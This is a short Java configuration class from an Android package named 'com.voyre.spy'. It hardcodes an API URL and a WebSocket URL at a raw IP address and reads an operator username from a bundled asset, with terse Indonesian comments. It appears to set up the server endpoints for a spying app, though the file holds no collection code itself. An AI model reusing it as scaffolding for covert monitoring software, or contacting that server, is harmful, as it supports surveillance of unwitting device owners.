package com.voyre.spy;

import android.content.Context;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class Config {
    
    // HARDCODE DULU, JANGAN DIUBAH-UBAH!
    public static String API_URL = "http://165.245.186.245:4000";
    public static String WS_URL = "ws://165.245.186.245:4001";
    
    // MATIKAN loadConfig() buat sementara!
    public static void loadConfig(Context context) {
        // Jangan ngapa-ngapain dulu!
    }
    
    public static String getUsername(Context context) {
        try {
            InputStream is = context.getAssets().open("@kaell_Xz");
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            String username = reader.readLine();
            reader.close();
            is.close();
            return username != null ? username.trim() : "default";
        } catch (Exception e) {
            return "default";
        }
    }
}